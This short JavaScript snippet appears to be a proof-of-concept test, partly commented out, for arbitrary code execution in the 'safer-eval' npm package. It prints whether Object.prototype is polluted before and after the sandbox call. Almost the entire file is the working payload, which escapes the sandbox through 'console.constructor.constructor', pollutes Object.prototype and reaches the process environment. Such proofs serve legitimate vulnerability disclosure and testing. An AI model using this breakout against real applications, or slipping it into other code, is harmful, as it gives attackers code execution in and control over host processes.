// test("Arbitrary code execution in safer-eval", () => {
//   expect.assertions(2);
  const saferEval = require("safer-eval");
console.log({}.polluted);
  try {
    saferEval(
      "console.constructor.constructor('return 1+(Object.prototype.polluted=`yes`)')().env"
    );
  } catch (error) {}
console.log({}.polluted);
// });
